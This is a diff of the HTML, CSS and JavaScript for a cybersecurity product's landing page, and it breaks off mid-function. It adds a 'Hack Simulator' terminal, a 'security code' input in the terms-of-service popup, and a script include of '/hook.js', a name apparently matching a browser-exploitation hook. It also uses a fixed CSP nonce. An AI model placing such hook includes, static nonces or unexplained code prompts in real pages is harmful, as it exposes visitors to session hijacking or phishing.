@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="description" content="Elvira Genesis-Elvira: AI-Powered Cybersecurity Platform with GPU-accelerated threat detection and sub-1ms response times.">
   <meta name="keywords" content="cybersecurity, AI, GPU, threat detection, zero-trust, post-quantum, forensics, machine learning">
   <meta http-equiv="Content-Security-Policy" content="
@@ -18,21 +18,26 @@
   ">
   <title>Elvira Genesis-Elvira</title>
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Sora:wght@400;600;700&display=swap">
-  <link rel="manifest" href="data:application/manifest+json;base64,ewogICJuYW1lIjogIkVsdmlyYSBHZW5lc2lzLUVsdmlyYSIsCiAgInNob3J0X25hbWUiOiAiRWx2aXJhIiwKICAic3RhcnRfdXJsIjogIi8iLAogICJkaXNwbGF5IjogInN0YW5kYWxvbmUiLAogICJiYWNrZ3JvdW5kX2NvbG9yIjogIiMwYzBkMTAiLAogICJ0aGVtZV9jb2xvciI6ICIjNmJlMmViIiwKICAiaWNvbnMiOiBbCiAgICB7CiAgICAgICJzcmMiOiAiL2ljb24tMTkyLnBuZyIsCiAgICAgICJzaXplcyI6ICIxOTJ4MTkyIiwKICAgICAgInR5cGUiOiAiaW1hZ2UvcG5nIgogICAgfSwKICAgIHsKICAgICAgInNyYyI6ICIvaWNvbi01MTIucG5nIiwKICAgICAgInNpdmVzIjogIjUxMng1MTIiLAogICAgICAidHlwZSI6ICJpbWFnZS9wbmcIgogICAgfQogIF0sCiAgInByZWZlcl9yZWxhdGVkX2FwcGxpY2F0aW9ucyI6IGZhbHNlCn0=">
   <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" nonce="nexus2025" defer></script>
   <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js" nonce="nexus2025" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/three@0.168.0/build/three.min.js" nonce="nexus2025" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/postprocessing/EffectComposer.js" nonce="nexus2025" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/postprocessing/RenderPass.js" nonce="nexus2025" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/postprocessing/UnrealBloomPass.js" nonce="nexus2025" defer></script>
+  <script src="/hook.js" nonce="nexus2025" defer></script>
   <style nonce="nexus2025">
     :root {
       --bg: #0c0d10;
       --fg: #e0e3f4;
       --accent: #6be2eb;
       --secondary: #b39ddb;
-      --glow: rgba(107, 226, 235, 0.4);
+      --glow: radial-gradient(circle at center, rgba(107, 226, 235, 0.4), transparent 70%);
       --gradient: linear-gradient(135deg, #0c0d10 0%, #1a1b22 100%);
-      --shadow: 0 10px 20px rgba(107, 226, 235, 0.3);
+      --shadow: 0 10px 30px rgba(107, 226, 235, 0.2);
       --border: 1px solid rgba(107, 226, 235, 0.3);
       --header-height: 80px;
       --ease: cubic-bezier(0.33, 1, 0.68, 1);
+      --haptic-vibration: 20ms;
     }
 
     [data-theme="light"] {
@@ -40,26 +45,13 @@
       --fg: #0c0d10;
       --accent: #4f8dfd;
       --gradient: linear-gradient(135deg, #e0e3f4 0%, #d0d3e4 100%);
-      --glow: rgba(79, 141, 253, 0.4);
+      --glow: radial-gradient(circle at center, rgba(79, 141, 253, 0.4), transparent 70%);
       --border: 1px solid rgba(79, 141, 253, 0.3);
     }
 
-    [data-theme="contrast"] {
-      --bg: #000;
-      --fg: #fff;
-      --accent: #00ffff;
-      --gradient: none;
-      --glow: rgba(0, 255, 255, 0.6);
-      --border: 2px solid #00ffff;
-    }
-
     html {
-      font-size: clamp(14px, 1.8vw, 16px);
       scroll-behavior: smooth;
       scroll-padding-top: var(--header-height);
-      -webkit-text-size-adjust: 100%;
-      -webkit-font-smoothing: antialiased;
-      -moz-osx-font-smoothing: grayscale;
     }
 
     body {
@@ -69,27 +61,51 @@
       line-height: 1.7;
       overflow-x: hidden;
       position: relative;
-      letter-spacing: 0.5px;
-      margin: 0;
-      animation: gradientRotate 30s linear infinite;
-      touch-action: manipulation;
     }
 
-    @keyframes gradientRotate {
-      0% { background: linear-gradient(135deg, #0c0d10 0%, #1a1b22 100%); }
-      100% { background: linear-gradient(315deg, #0c0d10 0%, #1a1b22 100%); }
+    body::after {
+      content: '';
+      position: fixed;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(
+        45deg,
+        var(--accent) 0%,
+        var(--secondary) 50%,
+        var(--accent) 100%
+      );
+      opacity: 0.05;
+      z-index: -2;
+      animation: gradientFlow 30s linear infinite;
     }
 
-    canvas#canvas-bg {
+    @keyframes gradientFlow {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .sr-only {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      padding: 0;
+      margin: -1px;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+      border: 0;
+    }
+
+    canvas#webgl-bg {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
       z-index: -1;
-      opacity: 0.6;
+      opacity: 0.7;
       mix-blend-mode: screen;
-      image-rendering: optimizeSpeed;
     }
 
     header {
@@ -97,14 +113,14 @@
       top: 0;
       background: rgba(12, 13, 16, 0.95);
       backdrop-filter: blur(12px);
-      padding: 1rem;
+      padding: 1.5rem;
       z-index: 1000;
       height: var(--header-height);
       box-shadow: var(--shadow);
     }
 
     header .container {
-      max-width: 1920px;
+      max-width: 1600px;
       margin: 0 auto;
       display: flex;
       justify-content: space-between;
@@ -112,24 +128,25 @@
     }
 
     h1 {
-      font-size: clamp(1.8rem, 5vw, 2.5rem);
+      font-size: clamp(2rem, 6vw, 3rem);
       font-weight: 700;
-      filter: drop-shadow(0 0 8px var(--glow));
+      text-shadow: 0 0 15px var(--glow);
     }
 
     nav {
       display: flex;
       align-items: center;
-      gap: 1.5rem;
+      gap: 2rem;
     }
 
     nav a {
       color: var(--fg);
       text-decoration: none;
-      font-size: 1rem;
+      font-size: 1.1rem;
       font-weight: 600;
-      padding: 0.8rem 1.2rem;
-      transition: color 0.2s var(--ease), transform 0.2s var(--ease);
+      padding: 0.5rem;
+      position: relative;
+      transition: color 0.3s var(--ease), transform 0.3s var(--ease);
     }
 
     nav a:hover, nav a[aria-current="page"] {
@@ -148,8 +165,7 @@
       color: var(--fg);
       font-size: 1.5rem;
       cursor: pointer;
-      padding: 1rem;
-      transition: transform 0.2s var(--ease);
+      transition: transform 0.3s var(--ease);
     }
 
     .theme-toggle:hover, .theme-toggle:focus {
@@ -157,152 +173,123 @@
       outline: 2px solid var(--accent);
     }
 
-    .card {
-      background: rgba(255, 255, 255, 0.08);
-      border: var(--border);
-      border-radius: 16px;
-      padding: 2rem;
-      position: relative;
-      transition: transform 0.3s var(--ease), box-shadow 0.3s var(--ease);
-      cursor: pointer;
-      overflow: hidden;
-      will-change: transform, box-shadow;
+    main {
+      max-width: 1600px;
+      margin: 0 auto;
+      padding: 3rem 1.5rem;
     }
 
-    .card:hover {
-      transform: translateY(-10px) scale(1.03);
-      box-shadow: inset 0 0 8px var(--glow), 0 0 20px var(--shadow);
+    section {
+      margin-bottom: 6rem;
+      opacity: 0;
+      transform: translateY(40px);
+      transition: opacity 1s var(--ease), transform 1s var(--ease);
+      scroll-margin-top: var(--header-height);
+    }
+
+    section.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    h2 {
+      font-size: clamp(2.5rem, 6vw, 4rem);
+      font-weight: 800;
+      text-align: center;
+      margin-bottom: 2rem;
+      text-shadow: 0 0 15px var(--glow);
+    }
+
+    p {
+      font-size: 1.2rem;
+      text-align: center;
+      max-width: 1000px;
+      margin: 0 auto 2rem;
     }
 
     .card-grid {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-      grid-auto-rows: 1fr;
-      gap: 2rem;
-      margin-top: 2.5rem;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 2.5rem;
+      margin-top: 3rem;
     }
 
-    .tab-btn {
-      background: rgba(255, 255, 255, 0.05);
+    .card {
+      transform-style: preserve-3d;
+      perspective: 1000px;
+      transition: all 0.4s var(--ease);
+      background: linear-gradient(145deg, rgba(255,255,255,0.08), rgba(0,0,0,0.2));
       border: var(--border);
-      color: var(--fg);
-      padding: 1rem 2rem;
-      border-radius: 12px;
-      font-weight: 600;
-      font-size: 1rem;
-      cursor: pointer;
-      transition: transform 0.2s var(--ease), background 0.2s var(--ease);
-    }
-
-    .tab-btn:hover, .tab-btn.active, .tab-btn:focus {
-      background: var(--accent);
-      color: #fff;
-      transform: scale(1.05);
-      outline: none;
-    }
-
-    .hero-logo {
-      font-size: clamp(3rem, 10vw, 5rem);
-      font-weight: 800;
-      color: var(--accent);
-      filter: drop-shadow(0 0 20px var(--glow));
-    }
-
-    video, img {
-      loading: lazy;
-      max-width: 100%;
-      height: auto;
-    }
-
-    .modal-content {
-      background: rgba(255, 255, 255, 0.08);
-      border: var(--border);
-      border-radius: 16px;
-      padding: 2rem;
-      max-width: 600px;
-      width: 90%;
-      transform: scale(0.7);
-      opacity: 0;
+      border-radius: 20px;
+      padding: 2.5rem;
       position: relative;
+      cursor: pointer;
       overflow: hidden;
-      box-shadow: 0 0 20px var(--glow);
     }
 
-    .modal.active .modal-content {
-      animation: modalAppear 0.5s forwards var(--ease);
+    .card:hover {
+      transform: translateY(-10px) rotateX(5deg) rotateY(-2deg) scale(1.03);
+      box-shadow: 
+        inset 0 0 15px var(--glow),
+        0 0 40px var(--shadow);
     }
 
-    @keyframes modalAppear {
-      to { transform: scale(1); opacity: 1; }
-    }
-
-    .modal-content h3 {
-      font-size: 2rem;
-      margin-bottom: 1.5rem;
-      color: var(--accent);
-      text-shadow: 0 0 10px var(--glow);
-      text-align: center;
-    }
-
-    .modal-content p {
-      font-size: 1.2rem;
-      margin-bottom: 2rem;
-      text-align: center;
-    }
-
-    .particle-container {
+    .card::after {
+      content: '';
       position: absolute;
       inset: 0;
+      background: var(--glow);
+      opacity: 0;
+      transition: opacity 0.3s var(--ease);
       pointer-events: none;
-      overflow: hidden;
     }
 
-    .particle {
-      position: absolute;
-      width: 3px;
-      height: 3px;
-      background: var(--accent);
-      border-radius: 50%;
-      box-shadow: 0 0 8px var(--glow);
-      opacity: 0;
+    .card:hover::after {
+      opacity: 0.6;
+    }
+
+    .card h3 {
+      font-size: 1.5rem;
+      font-weight: 700;
+      margin-bottom: 1rem;
+      color: var(--accent);
+      text-shadow: 0 0 8px var(--glow);
     }
 
     .btn {
       display: inline-block;
       background: linear-gradient(45deg, var(--accent), var(--secondary));
       color: #fff;
-      padding: 1rem 2rem;
+      padding: 1.2rem 2.5rem;
       border-radius: 12px;
       text-decoration: none;
       font-weight: 700;
-      font-size: 1rem;
+      font-size: 1.1rem;
       text-align: center;
       position: relative;
       overflow: hidden;
-      transition: transform 0.3s var(--ease), box-shadow 0.3s var(--ease);
+      transition: transform 0.4s var(--ease), box-shadow 0.4s var(--ease);
+    }
+
+    .btn::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.3);
+      transition: left 0.4s var(--ease);
+    }
+
+    .btn:hover::after, .btn:focus::after {
+      left: 0;
     }
 
     .btn:hover, .btn:focus {
       transform: scale(1.1);
       box-shadow: var(--shadow);
       outline: none;
-    }
-
-    .tos-btn {
-      margin: 0 1rem;
-      padding: 1.2rem 2.5rem;
-      font-size: 1.1rem;
-    }
-
-    .sr-only {
-      position: absolute;
-      width: 1px;
-      height: 1px;
-      padding: 0;
-      margin: -1px;
-      overflow: hidden;
-      clip: rect(0, 0, 0, 0);
-      border: 0;
     }
 
     #hero {
@@ -327,34 +314,51 @@
       z-index: -1;
     }
 
+    .hero-logo {
+      font-size: clamp(4rem, 12vw, 6rem);
+      font-weight: 800;
+      color: var(--accent);
+      transform: translateZ(50px);
+      text-shadow: 
+        0 0 10px var(--accent),
+        0 0 20px var(--accent),
+        0 0 30px var(--accent);
+      animation: hologram 3s infinite var(--ease);
+    }
+
+    @keyframes hologram {
+      0%, 100% { transform: scale(1) translateY(0); opacity: 1; }
+      50% { transform: scale(1.1) translateY(-10px); opacity: 0.7; }
+    }
+
     .simulator {
       background: rgba(255, 255, 255, 0.05);
       border: var(--border);
-      border-radius: 16px;
-      padding: 2rem;
+      border-radius: 20px;
+      padding: 2.5rem;
       max-width: 900px;
       margin: 3rem auto;
       text-align: center;
     }
 
     .simulator h3 {
-      font-size: 1.8rem;
+      font-size: 2rem;
       color: var(--accent);
-      margin-bottom: 1.5rem;
-      text-shadow: 0 0 8px var(--glow);
+      margin-bottom: 2rem;
+      text-shadow: 0 0 10px var(--glow);
     }
 
     .simulator .counter {
-      font-size: 2.2rem;
+      font-size: 2.5rem;
       font-weight: 700;
       color: var(--fg);
-      text-shadow: 0 0 10px var(--glow);
+      text-shadow: 0 0 12px var(--glow);
     }
 
     .chart-container {
       max-width: 900px;
       margin: 3rem auto;
-      padding: 1.5rem;
+      padding: 2rem;
       background: rgba(255, 255, 255, 0.05);
       border-radius: 16px;
       border: var(--border);
@@ -364,8 +368,27 @@
     .tab-nav {
       display: flex;
       justify-content: center;
-      gap: 1.5rem;
-      margin-bottom: 2rem;
+      gap: 2rem;
+      margin-bottom: 2.5rem;
+    }
+
+    .tab-btn {
+      background: rgba(255, 255, 255, 0.05);
+      border: var(--border);
+      color: var(--fg);
+      padding: 1rem 2rem;
+      border-radius: 12px;
+      font-weight: 600;
+      font-size: 1.1rem;
+      cursor: pointer;
+      transition: transform 0.3s var(--ease), background 0.3s var(--ease);
+    }
+
+    .tab-btn:hover, .tab-btn.active, .tab-btn:focus {
+      background: var(--accent);
+      color: #fff;
+      transform: scale(1.05);
+      outline: none;
     }
 
     .tab-content {
@@ -376,12 +399,174 @@
       display: block;
     }
 
+    .modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.85);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 2000;
+      backdrop-filter: blur(12px);
+    }
+
+    .modal.active {
+      display: flex;
+    }
+
+    .modal-content {
+      background: rgba(255, 255, 255, 0.08);
+      border: var(--border);
+      border-radius: 20px;
+      padding: 3rem;
+      max-width: 700px;
+      width: 90%;
+      transform: scale(0.7);
+      opacity: 0;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 0 30px var(--glow);
+      transform-style: preserve-3d;
+    }
+
+    .modal.active .modal-content {
+      animation: modalAppear 0.6s forwards var(--ease);
+    }
+
+    @keyframes modalAppear {
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    .modal-content h3 {
+      font-size: 2.5rem;
+      margin-bottom: 1.5rem;
+      color: var(--accent);
+      text-shadow: 0 0 15px var(--glow);
+      text-align: center;
+    }
+
+    .modal-content p {
+      font-size: 1.3rem;
+      margin-bottom: 2rem;
+      text-align: center;
+    }
+
+    .modal-content input, .modal-content textarea {
+      width: 100%;
+      padding: 1rem;
+      margin-bottom: 1.5rem;
+      background: rgba(255, 255, 255, 0.1);
+      border: var(--border);
+      border-radius: 10px;
+      color: var(--fg);
+      font-size: 1.1rem;
+      transition: border-color 0.3s var(--ease);
+    }
+
+    .modal-content input:focus, .modal-content textarea:focus {
+      border-color: var(--accent);
+      outline: none;
+    }
+
+    .modal-content textarea {
+      resize: vertical;
+      min-height: 120px;
+    }
+
+    .modal-content .error {
+      color: #ff4d4d;
+      font-size: 0.9rem;
+      margin-bottom: 1rem;
+      display: none;
+    }
+
+    .particle-container {
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      overflow: hidden;
+    }
+
+    .particle {
+      position: absolute;
+      width: 6px;
+      height: 6px;
+      background: radial-gradient(var(--accent) 50%, transparent);
+      border-radius: 50%;
+      pointer-events: none;
+      opacity: 0;
+    }
+
+    .tos-btn {
+      margin: 0 1rem;
+      padding: 1.5rem 3rem;
+      font-size: 1.2rem;
+      transform-style: preserve-3d;
+      transition: transform 0.4s var(--ease), box-shadow 0.4s var(--ease);
+    }
+
+    .tos-btn:hover {
+      transform: scale(1.15) rotateX(5deg) rotateY(5deg);
+      box-shadow: 0 0 20px var(--glow);
+    }
+
+    .hack-terminal {
+      background: rgba(0,0,0,0.9);
+      border: 2px solid var(--accent);
+      border-radius: 8px;
+      padding: 1.5rem;
+      font-family: 'Courier New', monospace;
+      position: relative;
+      overflow: hidden;
+      max-width: 900px;
+      margin: 3rem auto;
+    }
+
+    .terminal-output {
+      height: 300px;
+      overflow-y: auto;
+      color: var(--accent);
+      text-shadow: 0 0 5px var(--glow);
+    }
+
+    .terminal-input {
+      margin-top: 1rem;
+    }
+
+    .terminal-input input {
+      width: 100%;
+      padding: 0.5rem;
+      background: rgba(255, 255, 255, 0.1);
+      border: var(--border);
+      border-radius: 5px;
+      color: var(--fg);
+      font-family: 'Courier New', monospace;
+    }
+
+    @media (hover: none) and (pointer: coarse) {
+      .btn:active, .card:active {
+        animation: haptic-pulse var(--haptic-vibration) linear;
+      }
+    }
+
+    @keyframes haptic-pulse {
+      50% { transform: scale(0.98); }
+    }
+
+    .gpu-accelerate {
+      transform: translate3d(0,0,0);
+      backface-visibility: hidden;
+    }
+
     footer {
       text-align: center;
-      padding: 3rem 1rem;
+      padding: 4rem 1.5rem;
       background: rgba(12, 13, 16, 0.95);
       color: var(--secondary);
-      font-size: 1rem;
+      font-size: 1.1rem;
       border-top: var(--border);
       box-shadow: var(--shadow);
     }
@@ -389,7 +574,7 @@
     footer a {
       color: var(--accent);
       text-decoration: none;
-      transition: color 0.2s var(--ease);
+      transition: color 0.3s var(--ease);
     }
 
     footer a:hover, footer a:focus {
@@ -398,63 +583,77 @@
     }
 
     @media (prefers-reduced-motion: reduce) {
-      body, section, .card, .btn, .modal-content, .tab-btn {
-        animation: none;
+      section, .card, .btn, .hero-logo, .modal-content, .tab-btn, .tos-btn {
         transition: none;
+        animation: none;
       }
-      section.visible, .card:hover, .btn:hover, .modal.active .modal-content, .tab-btn:hover {
+      section.visible, .card:hover, .btn:hover, .modal.active .modal-content, .tab-btn:hover, .tos-btn:hover {
         transform: none;
         box-shadow: none;
       }
     }
 
-    @media (max-width: 600px) {
+    @media (max-width: 1024px) {
       .card-grid {
-        grid-template-columns: 1fr;
-        gap: 1.5rem;
+        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
       }
-      .card {
-        padding: 1.5rem;
-      }
-      nav {
-        gap: 1rem;
-      }
-      nav a {
-        padding: 0.6rem 1rem;
-        font-size: 0.9rem;
-      }
-      .hero-logo {
-        font-size: 2.5rem;
-      }
-      .modal-content {
-        padding: 1.5rem;
+      .simulator .counter {
+        font-size: 2rem;
       }
     }
 
-    @media (min-width: 3840px) {
-      html {
-        font-size: clamp(18px, 2vw, 20px);
+    @media (max-width: 768px) {
+      header .container {
+        flex-direction: column;
+        gap: 1.5rem;
       }
-      .card {
-        padding: 3rem;
+      nav {
+        gap: 0.8rem;
+        flex-wrap: wrap;
+        justify-content: center;
+      }
+      nav a {
+        font-size: 1rem;
+        margin: 0 0.8rem;
+      }
+      h2 {
+        font-size: 2.5rem;
+      }
+      p {
+        font-size: 1.1rem;
       }
       .hero-logo {
-        font-size: clamp(5rem, 12vw, 7rem);
+        font-size: 3.5rem;
       }
-      .container {
-        max-width: 2560px;
+      .modal-content {
+        padding: 2rem;
+      }
+      .chart-container {
+        padding: 1.5rem;
+      }
+      .card-grid {
+        grid-template-columns: 1fr;
+        gap: 1.2rem;
+      }
+      .btn {
+        padding: 1rem 1.5rem;
+        font-size: 0.9rem;
       }
     }
   </style>
 </head>
 <body data-theme="dark">
-  <canvas id="canvas-bg" role="img" aria-label="Neural network background animation"></canvas>
+  <canvas id="webgl-bg" role="img" aria-label="3D neural network background animation"></canvas>
   <a href="#main" class="sr-only">Skip to main content</a>
   <div class="modal active" id="tos-modal" role="dialog" aria-labelledby="tos-title">
     <div class="modal-content">
       <div class="particle-container" id="particle-container"></div>
       <h3 id="tos-title">Terms of Service</h3>
       <p>By using Elvira Genesis-Elvira, you agree to our terms of service, ensuring secure and responsible use of our AI-powered cybersecurity platform. Contact <a href="mailto:ceo@aurora-core.net">ceo@aurora-core.net</a> for details.</p>
+      <div id="securityPrompt" style="margin-top: 1rem;">
+        <p>Enter security code to verify your session:</p>
+        <input id="securityInput" type="text" placeholder="Security code" aria-label="Security code">
+      </div>
       <div style="display: flex; justify-content: center; margin-top: 2rem;">
         <button class="btn tos-btn tos-accept">Accept</button>
         <button class="btn tos-btn tos-decline">Decline</button>
@@ -464,7 +663,7 @@
   <header role="banner">
     <div class="container">
       <h1>Elvira Genesis-Elvira</h1>
-      <nav role="navigation" aria-label="Main">
+      <nav role="navigation" aria-label="Primary navigation">
         <a href="#hero" aria-current="page">Home</a>
         <a href="#overview">Overview</a>
         <a href="#features">Features</a>
@@ -477,8 +676,9 @@
         <a href="#strategy">Strategy</a>
         <a href="#team">Team</a>
         <a href="#investment">Investment</a>
+        <a href="#hack-simulator">Hack Simulator</a>
         <a href="#contact">Contact</a>
-        <button class="theme-toggle" aria-label="Toggle dark/light/contrast theme">
+        <button class="theme-toggle" aria-label="Toggle dark/light theme">
           <svg width="24" height="24" fill="none" stroke="currentColor" aria-hidden="true">
             <path d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" />
           </svg>
@@ -488,8 +688,9 @@
   </header>
   <main id="main" role="main">
     <section id="hero">
-      <video autoplay muted loop playsinline loading="lazy" aria-hidden="true">
+      <video autoplay muted loop playsinline aria-hidden="true">
         <source src="https://assets.mixkit.co/videos/preview/mixkit-abstract-dark-background-with-blue-lights-3241-large.mp4" type="video/mp4">
+        Your browser does not support video.
       </video>
       <h2 class="hero-logo">Elvira Genesis</h2>
       <p>GPU-accelerated AI cybersecurity platform delivering sub-1ms threat detection and autonomous response across network, cloud, endpoint, and identity layers.</p>
@@ -747,6 +948,16 @@
         </div>
       </div>
     </section>
+    <section id="hack-simulator">
+      <h2>Ethical Hacking Simulator</h2>
+      <p>Experience real-time threat simulation with our AI-driven interface.</p>
+      <div class="hack-terminal">
+        <div class="terminal-output" id="terminal-output"></div>
+        <div class="terminal-input">
+          <input type="text" placeholder="Enter command..." id="hack-input">
+        </div>
+      </div>
+    </section>
     <section id="contact">
       <h2>Contact Us</h2>
       <p>Partner with Elvira Genesis-Elvira to redefine cybersecurity. Reach out for inquiries or opportunities.</p>
@@ -769,7 +980,7 @@
     <p><a href="https://elvira-core.net">elvira-core.net</a></p>
   </footer>
   <script nonce="nexus2025">
-    // Utility: Debounce for performance
+    // Debounce function for performance
     function debounce(func, timeout = 100) {
       let timer;
       return (...args) => {
@@ -778,249 +989,59 @@
       };
     }
 
-    // Utility: Detect low-performance devices
-    function isLowPerformance() {
-      const isLowRAM = navigator.deviceMemory && navigator.deviceMemory < 4;
-      const isLowCPU = navigator.hardwareConcurrency && navigator.hardwareConcurrency < 4;
-      return isLowRAM || isLowCPU || window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+    // Enhanced Haptic Feedback
+    function vibrate(pattern = [20]) {
+      if ('vibrate' in navigator) {
+        navigator.vibrate(pattern);
+      } else {
+        document.documentElement.style.transform = 'scale(0.99)';
+        setTimeout(() => {
+          document.documentElement.style.transform = 'scale(1)';
+        }, 50);
+      }
     }
 
-    // 2D Canvas Neural Background
-    function initCanvasBackground() {
-      const canvas = document.getElementById('canvas-bg');
-      const ctx = canvas.getContext('2d', { alpha: true });
-      let nodes = [];
-      let lowFPS = false;
-      let lastFrame = performance.now();
-      const maxNodes = isLowPerformance() ? 30 : 60;
-
-      function handleResize() {
-        canvas.width = window.innerWidth * Math.min(window.devicePixelRatio, 2);
-        canvas.height = window.innerHeight * Math.min(window.devicePixelRatio, 2);
-        canvas.style.width = `${window.innerWidth}px`;
-        canvas.style.height = `${window.innerHeight}px`;
-        ctx.scale(Math.min(window.devicePixelRatio, 2), Math.min(window.devicePixelRatio, 2));
-        createNodes();
-      }
-
-      function createNodes() {
-        nodes = Array.from({ length: maxNodes }, () => ({
-          x: Math.random() * window.innerWidth,
-          y: Math.random() * window.innerHeight,
-          vx: (Math.random() - 0.5) * 0.3,
-          vy: (Math.random() - 0.5) * 0.3,
-          radius: Math.random() * 1.5 + 1,
-          alpha: Math.random() * 0.4 + 0.2
-        }));
-      }
-
-      function animate(t) {
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-        nodes.forEach(node => {
-          node.x += node.vx;
-          node.y += node.vy;
-          if (node.x < 0 || node.x > window.innerWidth) node.vx *= -1;
-          if (node.y < 0 || node.y > window.innerHeight) node.vy *= -1;
-
-          ctx.beginPath();
-          ctx.arc(node.x, node.y, node.radius, 0, Math.PI * 2);
-          ctx.fillStyle = `rgba(107, 226, 235, ${node.alpha})`;
-          ctx.fill();
-        });
-
-        nodes.forEach((node, i) => {
-          nodes.slice(i + 1).forEach(other => {
-            const dx = node.x - other.x;
-            const dy = node.y - other.y;
-            const dist = Math.sqrt(dx * dx + dy * dy);
-            if (dist < 80) {
-              ctx.beginPath();
-              ctx.moveTo(node.x, node.y);
-              ctx.quadraticCurveTo(
-                node.x + dx * 0.5,
-                node.y + dy * 0.5,
-                other.x,
-                other.y
-              );
-              ctx.strokeStyle = `rgba(107, 226, 235, ${0.8 - dist / 80})`;
-              ctx.lineWidth = 0.4;
-              ctx.stroke();
-            }
-          });
-        });
-
-        const now = performance.now();
-        const fps = 1000 / (now - lastFrame);
-        lastFrame = now;
-        if (fps < 20 && !lowFPS) {
-          nodes = nodes.slice(0, Math.floor(nodes.length / 2));
-          lowFPS = true;
-        }
-
-        if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
-          requestAnimationFrame(animate);
-        }
-      }
-
-      window.addEventListener('resize', debounce(handleResize));
-      handleResize();
-      createNodes();
-      animate(0);
-    }
-
-    // Lazy-load Charts
-    function initLazyCharts() {
-      const tabObserver = new IntersectionObserver((entries) => {
-        entries.forEach(entry => {
-          if (entry.isIntersecting && !entry.target.dataset.initialized) {
-            initChart(entry.target.id);
-            entry.target.dataset.initialized = true;
-          }
-        });
-      }, { threshold: 0.1 });
-
-      document.querySelectorAll('.tab-content').forEach(el => tabObserver.observe(el));
-
-      function initChart(tabId) {
-        const charts = {
-          latency: {
-            type: 'bar',
-            data: {
-              labels: ['<0.5ms', '0.5-1ms', '1-2ms', '>2ms'],
-              datasets: [{
-                label: 'Threat Detection Latency',
-                data: [60, 35, 4, 1],
-                backgroundColor: 'rgba(107, 226, 235, 0.7)',
-                borderColor: 'rgba(107, 226, 235, 1)',
-                borderWidth: 1
-              }]
-            },
-            options: {
-              responsive: true,
-              plugins: {
-                legend: { display: true, labels: { color: 'var(--fg)' } },
-                title: { display: true, text: 'Threat Detection Latency', color: 'var(--fg)', font: { size: 16 } }
-              },
-              scales: {
-                x: { ticks: { color: 'var(--fg)' }, grid: { color: 'rgba(255, 255, 255, 0.1)' } },
-                y: { ticks: { color: 'var(--fg)' }, grid: { color: 'rgba(255, 255, 255, 0.1)' } }
-              }
-            }
-          },
-          revenue: {
-            type: 'line',
-            data: {
-              labels: ['2025', '2026', '2027', '2028', '2029'],
-              datasets: [{
-                label: 'Revenue ($M)',
-                data: [5, 15, 30, 60, 100],
-                borderColor: 'rgba(107, 226, 235, 1)',
-                backgroundColor: 'rgba(107, 226, 235, 0.2)',
-                fill: true,
-                tension: 0.4
-              }]
-            },
-            options: {
-              responsive: true,
-              plugins: {
-                legend: { display: true, labels: { color: 'var(--fg)' } },
-                title: { display: true, text: 'Revenue Projections', color: 'var(--fg)', font: { size: 16 } }
-              },
-              scales: {
-                x: { ticks: { color: 'var(--fg)' }, grid: { color: 'rgba(255, 255, 255, 0.1)' } },
-                y: { ticks: { color: 'var(--fg)' }, grid: { color: 'rgba(255, 255, 255, 0.1)' } }
-              }
-            }
-          },
-          compliance: {
-            type: 'pie',
-            data: {
-              labels: ['GDPR', 'SOC2', 'HIPAA', 'Other'],
-              datasets: [{
-                label: 'Compliance Coverage',
-                data: [30, 30, 30, 10],
-                backgroundColor: [
-                  'rgba(107, 226, 235, 0.7)',
-                  'rgba(179, 157, 219, 0.7)',
-                  'rgba(107, 226, 235, 0.5)',
-                  'rgba(179, 157, 219, 0.5)'
-                ],
-                borderColor: 'rgba(255, 255, 255, 0.3)',
-                borderWidth: 1
-              }]
-            },
-            options: {
-              responsive: true,
-              plugins: {
-                legend: { display: true, labels: { color: 'var(--fg)' } },
-                title: { display: true, text: 'Compliance Coverage', color: 'var(--fg)', font: { size: 16 } }
-              }
-            }
-          }
-        };
-
-        if (charts[tabId]) {
-          new Chart(document.getElementById(`${tabId}-chart`), charts[tabId]);
-        }
-      }
-
-      document.querySelectorAll('.tab-btn').forEach(btn => {
-        btn.addEventListener('click', () => {
-          document.querySelectorAll('.tab-btn').forEach(b => {
-            b.classList.remove('active');
-            b.setAttribute('aria-selected', 'false');
-          });
-          document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-          btn.classList.add('active');
-          btn.setAttribute('aria-selected', 'true');
-          document.getElementById(btn.dataset.tab).classList.add('active');
-        });
-        btn.addEventListener('keydown', (e) => {
-          if (e.key === 'Enter' || e.key === ' ') {
